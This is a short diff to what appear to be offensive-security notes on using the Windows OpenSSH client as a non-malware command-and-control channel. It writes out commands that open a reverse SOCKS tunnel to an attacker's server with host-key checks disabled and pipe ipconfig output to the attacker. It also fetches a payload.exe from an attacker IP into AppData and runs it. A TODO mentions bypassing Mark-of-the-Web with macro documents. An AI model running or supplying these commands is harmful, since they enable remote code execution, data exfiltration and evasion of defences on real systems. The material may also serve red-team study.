@@ -17,7 +17,7 @@ Refer to this [[04 - Remote Port Forwarding|section]] for remote port forwarding
 
 ### Reverse Tunneling SOCKS Proxy
 
-Instead of dropping malware instead we'll use `proxychains` or `privoxy` with the SSH server (the attacker's server) as the command and control which is legitimate, safer, and more familiar performing things remotely. This is considered as a non-malware implant.
+Instead of dropping malware instead we'll use `proxychains` or `privoxy` with the SSH server (the attacker's server) as the command and control which is legitimate, safer, and more familiar performing things remotely. This is considered as a non-malware payload.
 
 ```
 C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -NTfCqR [127.0.0.1:]<SOCKS_proxy> -o "StrictHostKeyChecking=no"
@@ -42,7 +42,7 @@ ipconfig /all | %SYSTEMDIRECTORY%\OpenSSH\ssh.exe [-p <PORT>] "cat - > %COMPUTER
 Transfer file to the system.
 
 ```
-C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -o "StrictHostKeyChecking=no PermitLocalCommand=yes" -o "LocalCommand=scp [-P <PORT>] <username>@<attacker_IP>:implant.exe %AppData%\Microsoft\Templates\implant.exe\. && %APPDATA%\Microsoft\Templates\implant.exe" <username>@<attacker_IP>
+C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -o "StrictHostKeyChecking=no PermitLocalCommand=yes" -o "LocalCommand=scp [-P <PORT>] <username>@<attacker_IP>:payload.exe %AppData%\Microsoft\Templates\payload.exe\. && %APPDATA%\Microsoft\Templates\payload.exe" <username>@<attacker_IP>
 ```
 
 TODO: This can be used to transfer embedded macro document to bypass MOTW.
